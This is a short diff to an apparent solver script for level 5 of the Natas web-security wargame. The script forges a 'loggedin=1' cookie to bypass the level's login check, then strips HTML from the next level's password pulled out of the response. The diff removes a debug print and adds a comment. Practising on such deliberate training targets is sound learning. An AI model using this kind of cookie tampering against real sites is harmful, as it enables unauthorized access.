@@ -9,9 +9,9 @@ class Level_05(NatasLevel):
   def exploit(self) -> str:
 
     resp  = self.session.get(self.base_url, cookies = {'loggedin': '1'})
-    print(resp.text)
     match = re.search(r"natas6 is (\S+)", resp.text)
 
+    # In the response the password is followed by a "</div>", so replacing it with "" it desapears
     if "</div>" in match.group(1):
       return match.group(1).replace("</div>", "")
     else:
